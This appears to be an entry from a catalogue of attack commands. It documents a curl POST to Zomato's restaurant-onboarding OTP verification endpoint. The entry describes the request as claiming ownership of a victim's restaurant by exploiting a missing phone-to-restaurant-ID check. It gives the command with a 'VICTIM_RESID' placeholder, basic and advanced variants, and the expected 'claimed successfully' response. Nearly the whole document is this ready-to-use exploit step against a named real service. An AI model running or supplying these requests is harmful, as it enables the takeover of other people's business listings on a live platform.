---
data: >-
  curl -X POST
  https://www.zomato.com/restaurant-onboard-diy/v2/verify-auto-claim-otp -H
  "Content-Type: application/json" -d '{"verificationCode": "OTP_FROM_SMS",
  "requestId": "REQUEST_ID_FROM_STEP1", "resId": "VICTIM_RESID"}'
tags:
  - api
  - otp
  - verification
type: command
output: '{"status":"success","message":"Restaurant claimed successfully"}'
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.419Z'
id: ece4547c-32d2-4099-af16-c6383c2e5055
verified: false
validated: true
submitted: true
---
# curl-verify-otp-claim

## Command

```bash
curl -X POST https://www.zomato.com/restaurant-onboard-diy/v2/verify-auto-claim-otp \
  -H "Content-Type: application/json" \
  -d '{"verificationCode": "OTP_FROM_SMS", "requestId": "REQUEST_ID_FROM_STEP1", "resId": "VICTIM_RESID"}'
```

## Description

This command verifies the OTP and claims ownership of a restaurant by POSTing to Zomato's verification endpoint, exploiting the lack of phone-resId linkage to map the attacker's account.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload header | Yes |
| `-d '{...}'` | JSON data with verificationCode (OTP), requestId (from send step), resId (restaurant ID) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.zomato.com/restaurant-onboard-diy/v2/verify-auto-claim-otp \
  -H "Content-Type: application/json" \
  -d '{"verificationCode": "123456", "requestId": "abc123", "resId": "123456"}'
```

### Advanced Usage

With silent output and follow redirects:

```bash
curl -s -L -X POST https://www.zomato.com/restaurant-onboard-diy/v2/verify-auto-claim-otp \
  -H "Content-Type: application/json" \
  -d '{"verificationCode": "123456", "requestId": "abc123", "resId": "123456"}'
```

## Expected Output

JSON response confirming claim: {"status":"success","message":"Restaurant claimed successfully"}.

## Related

- [[commands/curl-send-otp-request]]
- [[procedures/Verify-OTP-to-Claim-Restaurant-Ownership]]
